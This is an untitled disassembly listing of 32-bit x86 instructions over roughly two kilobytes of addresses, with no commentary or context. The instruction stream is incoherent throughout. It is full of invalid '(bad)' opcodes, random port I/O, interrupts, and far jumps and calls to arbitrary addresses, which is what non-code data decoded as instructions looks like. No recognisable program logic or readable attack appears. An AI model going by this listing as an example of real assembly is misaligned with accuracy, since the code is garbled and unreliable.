  42347b:	lahf   
  42347c:	xchg   ebx,eax
  42347d:	push   0x17f580c9
  423482:	mov    ebp,DWORD PTR [edx]
  423484:	jns    0x423441
  423486:	jbe    0x42340b
  423488:	dec    edx
  423489:	data16 sbb ch,0x84
  42348d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42348e:	es hlt 
  423490:	mov    esp,0xb51e1ed8
  423495:	out    0x89,eax
  423497:	xor    al,0xfb
  423499:	jle    0x423435
  42349b:	pop    esp
  42349c:	push   edi
  42349d:	or     al,al
  42349f:	sub    al,0x12
  4234a1:	and    esp,0x66661492
  4234a7:	aas    
  4234a8:	aaa    
  4234a9:	test   DWORD PTR [eax+esi*8-0x1d212904],edi
  4234b0:	dec    esi
  4234b1:	or     eax,0xba28e42c
  4234b6:	jmp    0x78b0:0xaddc282a
  4234bd:	mov    ds:0x4263e71,al
  4234c2:	mov    esi,0xcb4a2a29
  4234c7:	fstp   TBYTE PTR [esi+edi*8-0x610acdc]
  4234ce:	sbb    esp,eax
  4234d0:	xor    edx,0xf5d5ee1a
  4234d6:	call   0xfd51:0x30dc1656
  4234dd:	daa    
  4234de:	xchg   edi,eax
  4234df:	inc    edx
  4234e0:	xchg   edx,eax
  4234e1:	jae    0x423481
  4234e3:	jle    0x423525
  4234e5:	jl     0x42349c
  4234e7:	pop    eax
  4234e8:	mov    dh,BYTE PTR [edi-0x733d5557]
  4234ee:	pop    es
  4234ef:	cmp    ebx,ebx
  4234f1:	imul   eax,DWORD PTR [ecx],0x6e
  4234f4:	daa    
  4234f5:	aas    
  4234f6:	daa    
  4234f7:	inc    esi
  4234f8:	xor    BYTE PTR [ecx-0x45ea4e2c],dh
  4234fe:	xrelease xchg BYTE PTR [ebx-0x2b3c721a],bh
  423505:	xor    DWORD PTR [edi],ebx
  423507:	mov    ah,0xa0
  423509:	iret   
  42350a:	pop    DWORD PTR [edx+0x30d2f455]
  423510:	mov    DWORD PTR [edi+0x4c],edi
  423513:	fidivr DWORD PTR [ebp+0x3934a8f1]
  423519:	retf   0xc34e
  42351c:	or     bl,bh
  42351e:	cmp    eax,0xea438123
  423523:	cmp    BYTE PTR [edx+ebx*8],al
  423526:	sti    
  423527:	jo     0x4234e4
  423529:	iret   
  42352a:	outs   dx,BYTE PTR ds:[esi]
  42352b:	inc    edi
  42352c:	jmp    0x6865:0x408f2d3e
  423533:	pop    ebx
  423534:	ins    DWORD PTR es:[edi],dx
  423535:	mov    ah,0xff
  423537:	test   BYTE PTR [edi-0x350bcb22],ah
  42353d:	sub    DWORD PTR [eax+0x45fe3788],edi
  423543:	or     BYTE PTR [ebp+edx*1+0x65],dh
  423547:	jo     0x423596
  423549:	stos   DWORD PTR es:[edi],eax
  42354a:	jp     0x4235c5
  42354c:	das    
  42354d:	sbb    eax,0x7e530d29
  423552:	(bad)  
  423554:	outs   dx,BYTE PTR ds:[esi]
  423555:	pop    ss
  423556:	lods   al,BYTE PTR ds:[esi]
  423557:	rol    BYTE PTR [eax],cl
  423559:	or     eax,0x69e824a8
  42355e:	pusha  
  42355f:	inc    esp
  423560:	ret    0xd323
  423563:	das    
  423564:	or     BYTE PTR [edx+0x4991fcd9],dh
  42356a:	inc    edi
  42356b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42356c:	int3   
  42356d:	pop    ecx
  42356e:	scas   al,BYTE PTR es:[edi]
  42356f:	jbe    0x423595
  423571:	add    BYTE PTR [ecx-0x19e2f63f],dh
  423577:	pop    ebp
  423578:	and    BYTE PTR [esi+0x1a],cl
  42357b:	mov    cl,0xf1
  42357d:	cmp    eax,0xbf53eca4
  423582:	mov    ds:0x5b20a2e2,al
  423587:	and    eax,0xf2081c38
  42358c:	pop    ebp
  42358d:	add    esi,DWORD PTR [esi+edi*1]
  423590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423591:	jecxz  0x42360f
  423593:	push   0xffffffaf
  423595:	stos   DWORD PTR es:[edi],eax
  423596:	or     al,0x6
  423598:	push   ebx
  423599:	sti    
  42359a:	dec    eax
  42359b:	test   edx,ebx
  42359d:	mov    edi,0xa2441f
  4235a2:	sbb    BYTE PTR ss:0x99a842fe,0x23
  4235aa:	sbb    ebx,ebp
  4235ac:	outs   dx,DWORD PTR ds:[esi]
  4235ad:	pop    edx
  4235ae:	inc    edx
  4235af:	add    DWORD PTR [esi],ebp
  4235b1:	add    BYTE PTR [edi-0x6b4e6389],bh
  4235b7:	xor    eax,0x7cabbe84
  4235bc:	xchg   ecx,eax
  4235bd:	or     eax,0xdeacdb44
  4235c2:	cmp    ebp,DWORD PTR [ebp+0x513b2c32]
  4235c8:	push   0xffffff81
  4235ca:	inc    ebx
  4235cb:	out    0xa7,eax
  4235cd:	jecxz  0x42355c
  4235cf:	sub    bl,BYTE PTR [esi]
  4235d1:	sub    DWORD PTR [edi+0x24],esp
  4235d4:	stc    
  4235d5:	adc    BYTE PTR [ebx],dh
  4235d7:	pop    esp
  4235d8:	jge    0x42362c
  4235da:	(bad)  
  4235db:	shr    DWORD PTR [eax],1
  4235dd:	adc    dl,dl
  4235df:	jge    0x423577
  4235e1:	loop   0x423661
  4235e3:	or     eax,0x524830c0
  4235e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235e9:	dec    ebp
  4235ea:	mov    bl,BYTE PTR [ebp+ebp*8-0x44e0641a]
  4235f1:	leave  
  4235f2:	es pop edi
  4235f4:	pop    ds
  4235f5:	lods   al,BYTE PTR ds:[esi]
  4235f6:	pop    ebx
  4235f7:	stc    
  4235f8:	cdq    
  4235f9:	hlt    
  4235fa:	js     0x4235b2
  4235fc:	fisubr WORD PTR [edi]
  4235fe:	stos   BYTE PTR es:[edi],al
  4235ff:	cmc    
  423600:	adc    eax,0x50ce6dca
  423605:	sar    DWORD PTR [edi+edx*8],0x1b
  423609:	or     DWORD PTR [eax+0xe],esp
  42360c:	sub    eax,0x1965fd29
  423611:	leave  
  423612:	into   
  423613:	sbb    ecx,DWORD PTR [ebp-0x71]
  423616:	(bad)
  42361a:	fistp  WORD PTR ds:0x7e77e3a4
  423620:	data16 add bl,BYTE PTR [esi-0x7]
  423624:	rcr    BYTE PTR [ebx+edi*2],1
  423627:	cmp    al,0xf1
  423629:	jmp    0x4235f0
  42362b:	out    dx,al
  42362c:	call   0x8bb831cf
  423631:	pop    ebx
  423632:	ss mov dh,0xd3
  423635:	push   0x71
  423637:	xchg   ecx,eax
  423638:	adc    ecx,DWORD PTR [ecx-0x4c]
  42363b:	sahf   
  42363c:	xor    ch,dl
  42363e:	adc    eax,0xcaf26f3c
  423643:	cld    
  423644:	mov    bl,0x59
  423646:	fild   QWORD PTR [eax+0x36]
  423649:	jge    0x4236a6
  42364b:	cmp    al,0xa8
  42364d:	xor    al,0xb7
  42364f:	xlat   BYTE PTR ds:[ebx]
  423650:	loopne 0x423671
  423652:	call   0xb9d0f743
  423657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423658:	mov    ecx,0x1f04451
  42365d:	in     al,0xb4
  42365f:	dec    edi
  423660:	sbb    DWORD PTR [esp+ebx*8+0x543f2b6f],ebp
  423667:	cli    
  423668:	push   esp
  423669:	and    al,0x46
  42366b:	pop    esp
  42366c:	jp     0x423631
  42366e:	lea    ebp,[edi]
  423670:	pushf  
  423671:	test   al,0x4a
  423673:	inc    ebx
  423674:	mov    eax,0xeda0f8f4
  423679:	jne    0x4236f9
  42367b:	mov    al,ds:0x22b8b98f
  423680:	xor    DWORD PTR [esi+edx*8-0x3b],edi
  423684:	in     eax,dx
  423685:	pop    eax
  423686:	or     BYTE PTR [edx-0x75],dl
  423689:	scas   eax,DWORD PTR es:[edi]
  42368a:	xchg   ecx,eax
  42368b:	or     ch,al
  42368d:	xor    BYTE PTR [ecx+0x28],0xbf
  423691:	mov    ch,0x9c
  423693:	push   ds
  423694:	adc    ebx,DWORD PTR [eax+0x29]
  423697:	out    0xe8,al
  423699:	inc    edx
  42369a:	int    0x64
  42369c:	and    ecx,DWORD PTR gs:[esp+ebp*4]
  4236a0:	lahf   
  4236a1:	dec    edi
  4236a2:	das    
  4236a3:	and    al,0xc1
  4236a5:	(bad)  ss:[edi]
  4236a8:	lea    edi,[ebx]
  4236aa:	adc    al,0x15
  4236ac:	shl    BYTE PTR [edx+0x25bf46b1],1
  4236b2:	enter  0x6c97,0x79
  4236b6:	jbe    0x423666
  4236b8:	inc    ebx
  4236b9:	dec    esp
  4236ba:	push   ebp
  4236bb:	or     bl,BYTE PTR [eax+0x575eeb2]
  4236c1:	adc    esi,DWORD PTR [ebx+ebp*1+0x7add3033]
  4236c8:	gs ds cld 
  4236cb:	(bad)  
  4236cc:	xor    al,0x8e
  4236ce:	out    0x57,al
  4236d0:	fcomp  QWORD PTR [ebp-0x5e]
  4236d3:	idiv   DWORD PTR [ebx-0x4ccda2b7]
  4236d9:	xchg   ebp,eax
  4236da:	mov    eax,0xf382af85
  4236df:	push   cs
  4236e0:	stc    
  4236e1:	cmp    DWORD PTR [edx+0x2f],esi
  4236e4:	adc    eax,0x39f7d580
  4236e9:	es jae 0x4236a7
  4236ec:	jecxz  0x4236bd
  4236ee:	ret    0xf7d0
  4236f1:	xchg   ecx,eax
  4236f2:	push   esp
  4236f3:	clc    
  4236f4:	das    
  4236f5:	sbb    esp,DWORD PTR [eax+0x127d36ea]
  4236fb:	stos   DWORD PTR es:[edi],eax
  4236fc:	pop    ss
  4236fd:	mov    ecx,0xb350299a
  423702:	sbb    eax,0xca387c76
  423707:	mov    ds:0xb1e31fd1,al
  42370c:	(bad)  
  42370d:	and    ch,ah
  42370f:	fild   QWORD PTR [esi+0x71]
  423712:	sbb    ecx,esp
  423714:	pop    es
  423715:	fmul   QWORD PTR ds:0x3c3b2923
  42371b:	mov    DWORD PTR [edx],ecx
  42371d:	popa   
  42371e:	test   al,0x12
  423720:	jno    0x4236e5
  423722:	hlt    
  423723:	sbb    eax,0x5058673c
  423728:	mov    ch,0x8e
  42372a:	cmp    al,0x97
  42372c:	stos   DWORD PTR es:[edi],eax
  42372d:	sub    bh,BYTE PTR ds:0x9d1935b2
  423733:	xchg   ebp,eax
  423734:	or     edx,esi
  423736:	sar    BYTE PTR [ecx],1
  423738:	cli    
  423739:	xchg   edi,eax
  42373a:	test   DWORD PTR [eax-0x42],esp
  42373d:	mov    al,ds:0x4ddc4c6b
  423742:	into   
  423743:	adc    DWORD PTR [edx],esp
  423745:	inc    BYTE PTR [ebp-0x5a]
  423748:	fild   DWORD PTR [ebx-0x59]
  42374b:	neg    DWORD PTR [ebx]
  42374d:	(bad)  
  42374e:	cld    
  42374f:	xchg   ebp,eax
  423750:	xchg   edi,eax
  423751:	push   ebp
  423752:	shl    DWORD PTR [edi+0x72],cl
  423755:	xchg   bh,dl
  423757:	lods   eax,DWORD PTR ss:[esi]
  423759:	outs   dx,BYTE PTR ds:[esi]
  42375a:	ror    DWORD PTR [edx],1
  42375c:	(bad)  
  42375d:	or     ch,ah
  42375f:	scas   al,BYTE PTR es:[edi]
  423760:	(bad)  
  423761:	aas    
  423762:	outs   dx,BYTE PTR ds:[esi]
  423763:	out    dx,eax
  423764:	int    0xae
  423766:	xchg   edx,edx
  423768:	sbb    DWORD PTR [edx],ebx
  42376a:	and    eax,0xc03815cb
  42376f:	xchg   esi,eax
  423770:	stc    
  423771:	js     0x42376c
  423773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423774:	enter  0xe817,0xf7
  423778:	test   DWORD PTR [edi-0x4b],ecx
  42377b:	add    ch,BYTE PTR [edi+0x73a00059]
  423781:	test   BYTE PTR [esi-0x7a],bh
  423784:	icebp  
  423785:	(bad)  
  423786:	fstp   DWORD PTR [ebx+0x48]
  423789:	sub    BYTE PTR [edx+edi*8+0x1a],ah
  42378d:	retf   
  42378e:	loopne 0x423740
  423790:	mov    dh,BYTE PTR [ecx-0x4d]
  423793:	mov    esp,0xa5071a38
  423798:	sbb    eax,DWORD PTR [eax-0x3e]
  42379b:	mov    DWORD PTR [ecx+0x7919fedf],ecx
  4237a1:	pop    ecx
  4237a2:	sbb    eax,DWORD PTR [edx]
  4237a4:	icebp  
  4237a5:	test   DWORD PTR [esi-0x74],esp
  4237a8:	mov    ebx,0xdd90a761
  4237ad:	mov    ebx,0xc85fd04e
  4237b2:	popf   
  4237b3:	loope  0x4237ab
  4237b5:	data16 fstp TBYTE PTR [eax]
  4237b8:	out    dx,al
  4237b9:	sbb    eax,0x7cfd4fb6
  4237be:	aaa    
  4237bf:	loop   0x42381a
  4237c1:	mov    dl,0xdb
  4237c3:	jno    0x42380e
  4237c5:	push   ds
  4237c6:	jmp    0x1f1595c8
  4237cb:	sbb    BYTE PTR [ebx+0x7f9551f],dh
  4237d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237d2:	mov    cl,ch
  4237d4:	push   fs
  4237d6:	call   0x3cbe6dca
  4237db:	cs sahf 
  4237dd:	gs stos DWORD PTR es:[edi],eax
  4237df:	lahf   
  4237e0:	into   
  4237e1:	add    DWORD PTR [esi],ebp
  4237e3:	jl     0x4237ab
  4237e5:	fadd   QWORD PTR [ebx-0x3]
  4237e8:	or     eax,0x21f4e873
  4237ed:	pop    es
  4237ee:	push   cs
  4237ef:	inc    esi
  4237f0:	bound  eax,QWORD PTR [ebx+0x33]
  4237f3:	sub    al,0x1b
  4237f5:	adc    al,0x65
  4237f7:	sub    al,0x17
  4237f9:	lods   al,BYTE PTR ds:[esi]
  4237fa:	mov    ecx,0x8a12a8fb
  4237ff:	push   ss
  423800:	mov    edi,0xa28f1a78
  423805:	fnstsw ax
  423807:	sub    al,0x97
  423809:	popf   
  42380a:	rcr    eax,0x4e
  42380d:	in     al,dx
  42380e:	cmc    
  42380f:	call   0x1fa0:0x52402b05
  423816:	push   ss
  423817:	jle    0x4237cd
  423819:	jne    0x423802
  42381b:	or     BYTE PTR [ecx+0x2880b8c5],bl
  423821:	jge    0x4237ce
  423823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423824:	mov    eax,0x62fdab31
  423829:	xchg   edx,eax
  42382a:	cmp    eax,0xe177ec6f
  42382f:	dec    esi
  423830:	dec    edx
  423831:	mov    DWORD PTR ds:0xbf93a2b7,ecx
  423837:	call   0xce58:0xb068897b
  42383e:	(bad)  
  42383f:	xchg   edx,eax
  423840:	or     al,al
  423842:	push   cs
  423843:	daa    
  423844:	push   esp
  423845:	mov    ecx,DWORD PTR [ebp+0x2ca7d310]
  42384b:	(bad)  
  42384c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42384d:	add    ah,0x97
  423850:	sbb    edx,DWORD PTR [ecx]
  423852:	xor    BYTE PTR [ecx+0x4f2918f6],ah
  423858:	ss mov ecx,0x7c61d34d
  42385e:	test   BYTE PTR [ecx-0x509a819a],0x2b
  423865:	add    ecx,DWORD PTR [edx+0x6b]
  423868:	inc    ebp
  423869:	out    0x8f,eax
  42386b:	pop    eax
  42386c:	ss (bad) 
  42386e:	sbb    eax,0xbf8e40ce
  423873:	ret    0xb47f
  423876:	add    DWORD PTR [ecx+0x25],ebx
  423879:	dec    edi
  42387a:	loop   0x423839
  42387c:	mov    al,0xf3
  42387e:	xchg   edi,eax
  42387f:	cmp    ebp,ecx
  423881:	pop    ebp
  423882:	jae    0x4238d4
  423884:	mov    esi,0x7d2fe697
  423889:	xchg   BYTE PTR [ecx-0x6dbd3117],bh
  42388f:	ret    
  423890:	mov    ebx,0x22c7379c
  423895:	arpl   WORD PTR ds:0xbb56fd70,cx
  42389b:	push   edi
  42389c:	mov    ebp,0xa699986f
  4238a1:	cmp    ch,ch
  4238a3:	mov    ds:0xc146ed28,al
  4238a8:	pop    ecx
  4238a9:	pop    edx
  4238aa:	and    eax,0xaf6915e5
  4238af:	popa   
  4238b0:	out    dx,al
  4238b1:	test   BYTE PTR [edx+0x25],0x36
  4238b5:	cmc    
  4238b6:	sbb    ah,BYTE PTR [eax+0x30aa8b04]
  4238bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238bd:	sbb    al,bh
  4238bf:	pop    ecx
  4238c0:	xchg   ebx,eax
  4238c1:	xchg   esi,eax
  4238c2:	aad    0xb9
  4238c4:	cmc    
  4238c5:	fcomp  QWORD PTR [eax+0x4928d6e6]
  4238cb:	int    0x70
  4238cd:	or     eax,0x7f543557
  4238d2:	stos   DWORD PTR es:[edi],eax
  4238d3:	addr16 repz out dx,eax
  4238d6:	cmp    eax,0x2fd50545
  4238db:	into   
  4238dc:	jmp    0x423912
  4238de:	mov    bh,cl
  4238e0:	push   ds
  4238e1:	jns    0x4238dc
  4238e3:	fidivr DWORD PTR [ebx-0x20]
  4238e6:	jge    0x423949
  4238e8:	dec    ebx
  4238e9:	mov    BYTE PTR [esi-0x61],bl
  4238ec:	add    DWORD PTR [eax-0x7567c921],ebx
  4238f2:	jg     0x42390d
  4238f4:	xchg   edx,esi
  4238f6:	in     eax,0xe7
  4238f8:	gs clc 
  4238fa:	inc    edx
  4238fb:	fild   QWORD PTR [esi]
  4238fd:	(bad)  
  4238fe:	and    eax,0x8443e357
  423903:	data16 sub BYTE PTR [ecx+edi*2-0x16],al
  423908:	cli    
  423909:	or     edx,DWORD PTR [eax-0xe36e7f]
  42390f:	lods   al,BYTE PTR ds:[esi]
  423910:	push   edx
  423911:	neg    DWORD PTR [ebp-0x2c29d372]
  423917:	imul   edi,ebp,0x7f7ce218
  42391d:	push   ds
  42391e:	cs jl  0x423949
  423921:	push   es
  423922:	shl    BYTE PTR [ecx+0x414085bc],0xef
  423929:	mov    ebp,0x441ab3bd
  42392e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42392f:	add    ah,BYTE PTR ds:[ecx]
  423932:	or     BYTE PTR [ebx+0x65],al
  423935:	inc    edi
  423936:	dec    esp
  423937:	jae    0x42391e
  423939:	xor    al,0xa6
  42393b:	fdiv   st,st(5)
  42393d:	mov    bl,0x20
  42393f:	inc    ecx
  423940:	ja     0x4238cf
  423942:	dec    edi
  423943:	es pop es
  423945:	pop    ss
  423946:	adc    eax,0xd85eb281
  42394b:	repnz (bad) 
  42394d:	shr    ch,0x99
  423950:	push   esp
  423951:	retf   0xf02c
  423954:	pop    esi
  423955:	xchg   esp,eax
  423956:	and    al,0x10
  423958:	in     al,0xdb
  42395a:	dec    ebx
  42395b:	xor    al,0xf6
  42395d:	clc    
  42395e:	inc    ebx
  42395f:	jl     0x423967
  423961:	inc    edi
  423962:	in     al,0xdc
  423964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423965:	sti    
  423966:	ja     0x423956
  423968:	popf   
  423969:	aaa    
  42396a:	fistp  QWORD PTR [edi]
  42396c:	(bad)  
  42396d:	or     BYTE PTR [ebx],bl
  42396f:	push   edx
  423970:	fdivr  QWORD PTR [edi-0xb]
  423973:	clc    
  423974:	add    ch,0xcb
  423977:	hlt    
  423978:	mov    ds:0x3b5ec3c1,al
  42397d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42397e:	out    dx,al
  42397f:	fsub   QWORD PTR [edx]
  423981:	jo     0x42395f
  423983:	pop    ecx
  423984:	cwde   
  423985:	and    BYTE PTR [ebx],0x32
  423988:	mov    eax,0x23315e04
  42398d:	mov    eax,ds:0x10a48739
  423992:	inc    edx
  423993:	jno    0x4239a1
  423995:	add    DWORD PTR [edx+eiz*2-0x5cd3e783],eax
  42399c:	das    
  42399d:	inc    ebx
  42399e:	ret    
  42399f:	sub    eax,0xae87dce4
  4239a4:	inc    edx
  4239a5:	cmp    eax,0xb4c58ef1
  4239aa:	int    0x40
  4239ac:	stc    
  4239ad:	lahf   
  4239ae:	pop    ss
  4239af:	mov    es:0x63967ed5,eax
  4239b5:	sbb    ecx,eax
  4239b7:	rcr    dh,cl
  4239b9:	dec    esp
  4239ba:	jo     0x4239d2
  4239bc:	daa    
  4239bd:	jle    0x42399e
  4239bf:	inc    esp
  4239c0:	aas    
  4239c1:	xor    BYTE PTR [ecx],al
  4239c3:	ror    BYTE PTR [ebp+0xa],1
  4239c6:	(bad)  
  4239c7:	jno    0x4239c0
  4239c9:	cmp    al,0xd7
  4239cb:	jnp    0x423a22
  4239cd:	into   
  4239ce:	or     DWORD PTR [ebx-0x2f767500],eax
  4239d4:	jbe    0x423974
  4239d6:	sti    
  4239d7:	les    ebx,FWORD PTR [ecx-0x50]
  4239da:	jne    0x4239bd
  4239dc:	inc    edi
  4239dd:	imul   edi,ebx,0x3c
  4239e0:	test   al,0x4f
  4239e2:	mov    DWORD PTR [edi+0x0],ecx
  4239e5:	cli    
  4239e6:	adc    DWORD PTR [ecx],ebp
  4239e8:	loopne 0x423a17
  4239ea:	jae    0x423a3b
  4239ec:	adc    BYTE PTR [edi+0x4ab454d3],cl
  4239f2:	jbe    0x423a03
  4239f4:	(bad)  
  4239f5:	mov    bh,0x2c
  4239f7:	adc    ebx,eax
  4239f9:	ror    edi,1
  4239fb:	aaa    
  4239fc:	pop    ds
  4239fd:	out    0xe3,eax
  4239ff:	shl    DWORD PTR [edx],0x6
  423a02:	add    BYTE PTR [eax-0x35b7723d],ah
  423a08:	jb     0x423997
  423a0a:	xor    BYTE PTR [ecx],ah
  423a0c:	add    BYTE PTR [edi],0xae
  423a0f:	pop    ebp
  423a10:	and    DWORD PTR [ebp+0x62d2c034],ebx
  423a16:	stc    
  423a17:	cmp    al,0x2c
  423a19:	push   ecx
  423a1a:	jnp    0x423a2f
  423a1c:	or     DWORD PTR [ecx+0x6a],ebx
  423a1f:	xchg   DWORD PTR [ebx+0x6c74d91f],eax
  423a25:	pop    edi
  423a26:	sub    DWORD PTR [ebp-0x49224e09],0xffffffdf
  423a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a2e:	bnd jae 0x423a37
  423a31:	push   edi
  423a32:	adc    esp,DWORD PTR [ebx+ebx*8-0x13]
  423a36:	pop    esp
  423a37:	idiv   bl
  423a39:	fisttp DWORD PTR [ecx+0x24dae667]
  423a3f:	cmp    al,0xb5
  423a41:	pop    edi
  423a42:	sbb    eax,0x10974788
  423a47:	stos   BYTE PTR es:[edi],al
  423a48:	adc    eax,0x6f4f2ac2
  423a4d:	es popa 
  423a4f:	and    DWORD PTR [ecx-0x75940a6a],edi
  423a55:	inc    ecx
  423a56:	lods   al,BYTE PTR ds:[esi]
  423a57:	xor    BYTE PTR [ebp+eiz*1-0x4f],al
  423a5b:	dec    ebp
  423a5c:	adc    eax,0xa4d0bbb8
  423a61:	lea    esi,[eax-0x3b]
  423a64:	push   esp
  423a65:	pop    es
  423a66:	cmc    
  423a67:	adc    DWORD PTR [ebx-0x4afb1f65],edi
  423a6d:	test   DWORD PTR [edi+0x9],edi
  423a70:	xchg   ebx,eax
  423a71:	adc    al,0xa4
  423a73:	rcl    DWORD PTR [ecx],cl
  423a75:	out    dx,eax
  423a76:	push   es
  423a77:	push   0x28124a0e
  423a7c:	pop    esi
  423a7d:	mov    ebp,0x12a9c08f
  423a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a83:	repz push edi
  423a85:	sub    eax,0x5a25b6bb
  423a8a:	ss pop es
  423a8c:	sbb    esi,DWORD PTR [esi+0x19]
  423a8f:	out    dx,al
  423a90:	dec    ebx
  423a91:	jge    0x423a2a
  423a93:	or     ah,bl
  423a95:	ficomp WORD PTR [eax]
  423a97:	and    bh,bh
  423a99:	int3   
  423a9a:	and    BYTE PTR [edx+edi*1],bh
  423a9d:	push   eax
  423a9e:	sub    dh,al
  423aa0:	inc    esi
  423aa1:	mov    edx,0x3ab99786
  423aa6:	cmp    al,0x28
  423aa8:	lock and al,BYTE PTR [ecx-0xfc5978e]
  423aaf:	mov    eax,ds:0xb8bf3157
  423ab4:	das    
  423ab5:	stos   BYTE PTR es:[edi],al
  423ab6:	pop    esp
  423ab7:	mov    cl,0x39
  423ab9:	add    al,dl
  423abb:	push   edi
  423abc:	test   DWORD PTR [esi+0x67722921],edi
  423ac2:	sbb    BYTE PTR [edx-0x1f],cl
  423ac5:	adc    al,0xca
  423ac7:	cmp    eax,0x37b5dfed
  423acc:	fldenv [eax+0x3061812]
  423ad2:	in     eax,0xf
  423ad4:	adc    eax,0x6d1ee818
  423ad9:	int    0x98
  423adb:	into   
  423adc:	jle    0x423aaa
  423ade:	shl    dh,cl
  423ae0:	push   ebx
  423ae1:	in     al,0x57
  423ae3:	jmp    0x423ad1
  423ae5:	test   DWORD PTR [ebp-0x2665d9df],edx
  423aeb:	xlat   BYTE PTR ds:[ebx]
  423aec:	hlt    
  423aed:	jmp    0xdae35693
  423af2:	cmc    
  423af3:	pusha  
  423af4:	in     eax,0x90
  423af6:	into   
  423af7:	mov    edx,0x2342613d
  423afc:	repz dec eax
  423afe:	sub    eax,edx
  423b00:	mov    DWORD PTR [edx+0x6b],ebx
  423b03:	xor    DWORD PTR [esi+ebp*4],esi
  423b06:	jg     0x423b7e
  423b08:	inc    edx
  423b09:	mov    ds:0x5f663a92,al
  423b0e:	cmp    eax,0xeaaf8b3
  423b13:	or     DWORD PTR [edi],ecx
  423b15:	test   BYTE PTR [edi],bh
  423b17:	jg     0x423b2b
  423b19:	sub    al,BYTE PTR [edi+0x3ac5c091]
  423b1f:	or     esi,eax
  423b21:	jb     0x423b08
  423b23:	sbb    cl,BYTE PTR [edx+0x4f]
  423b26:	dec    edx
  423b27:	mov    esp,0x7182b954
  423b2c:	push   0xedc4f045
  423b31:	dec    edi
  423b32:	sbb    ebx,ebx
  423b34:	adc    edx,0x14
  423b37:	bound  eax,QWORD PTR [ebx-0x2c]
  423b3a:	xchg   BYTE PTR [ebp+0x2e786661],ah
  423b40:	aas    
  423b41:	sub    al,ah
  423b43:	pop    esi
  423b44:	sbb    eax,0x83877463
  423b49:	shl    BYTE PTR [ecx],0xb9
  423b4c:	mov    eax,ds:0x68e6bffd
  423b51:	inc    eax
  423b52:	ins    DWORD PTR es:[edi],dx
  423b53:	(bad)
  423b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b58:	ds mov esi,0xfb6095d6
  423b5e:	std    
  423b5f:	gs add eax,edi
  423b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b63:	adc    al,0xe6
  423b65:	pop    es
  423b66:	retf   0x42ec
  423b69:	aas    
  423b6a:	test   eax,0xe7f395a1
  423b6f:	imul   ebx,DWORD PTR [eax],0x9f88b786
  423b75:	pop    esi
  423b76:	and    esi,DWORD PTR [esp+eiz*8]
  423b79:	push   ds
  423b7a:	out    0x8d,eax
  423b7c:	xlat   BYTE PTR ds:[ebx]
  423b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b7e:	nop
  423b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b80:	gs push esp
  423b82:	aam    0x12
  423b84:	sbb    ecx,DWORD PTR [esi+0x6b]
  423b87:	les    eax,FWORD PTR [edx+ecx*8+0x6b]
  423b8b:	jns    0x423b2c
  423b8d:	jp     0x423b81
  423b8f:	mov    DWORD PTR [eax+0x1a78c262],edx
  423b95:	mov    al,ds:0xc2214d2d
  423b9a:	sbb    BYTE PTR [ecx],ah
  423b9c:	or     al,0xf9
  423b9e:	addr16 fwait
  423ba0:	pop    edi
  423ba1:	stos   BYTE PTR es:[edi],al
  423ba2:	ja     0x423bb2
  423ba4:	inc    ecx
  423ba5:	dec    esp
  423ba6:	jl     0x423bed
  423ba8:	pop    esp
  423ba9:	dec    ecx
  423baa:	add    BYTE PTR [esi-0x6d],ah
  423bad:	loopne 0x423b81
  423baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bb0:	add    cl,BYTE PTR [edi]
  423bb2:	sub    edi,edx
  423bb4:	loop   0x423c21
  423bb6:	jmp    0x29933f3d
  423bbb:	mov    eax,ds:0xf3ef311b
  423bc0:	adc    bl,BYTE PTR [edx+esi*8-0x6]
  423bc4:	xchg   ebp,eax
  423bc5:	aas    
  423bc6:	lds    edi,FWORD PTR [eax]
  423bc8:	jnp    0x423c04
  423bca:	cwde   
  423bcb:	pop    edx
  423bcc:	push   cs
  423bcd:	or     esi,DWORD PTR [ecx+0x4c60d431]
  423bd3:	mov    cl,0x4
  423bd5:	mov    eax,ds:0x4d5843e5
  423bda:	mov    ds:0x20ad7cb,al
  423bdf:	push   edx
  423be0:	mov    eax,0x4b645f54
  423be5:	retf   0x81af
  423be8:	test   eax,0x1d6df16f
  423bed:	bound  ecx,QWORD PTR [esi+ecx*8-0x54c0ca59]
  423bf4:	mov    edi,0x90eca09
  423bf9:	(bad)  
  423bfa:	aad    0x12
  423bfc:	sbb    bl,BYTE PTR [ebp-0x2f2525c5]
  423c02:	dec    ecx
  423c03:	mov    WORD PTR [edx],fs
  423c05:	cld    
  423c06:	dec    esp
  423c07:	stos   BYTE PTR es:[edi],al
  423c08:	shrd   DWORD PTR [esi],esi,cl
  423c0b:	scas   al,BYTE PTR es:[edi]
  423c0c:	push   esp
  423c0d:	outs   dx,DWORD PTR ds:[esi]
  423c0e:	sbb    BYTE PTR [ebp+0x21],0x1b
  423c12:	xchg   ebx,eax
  423c13:	or     al,0x28
  423c15:	out    0x5b,eax
  423c17:	repz fistp QWORD PTR [edx]
  423c1a:	gs cld 
  423c1c:	or     eax,0x5c34db77
  423c21:	inc    esi
  423c22:	dec    ebp
  423c23:	sub    dl,BYTE PTR [ecx+0x6f04d6e4]
  423c29:	mov    esp,0x3166ac26
  423c2e:	popa   
  423c2f:	and    esi,DWORD PTR [esi+0x4f]
  423c32:	adc    BYTE PTR [eax-0x80],cl
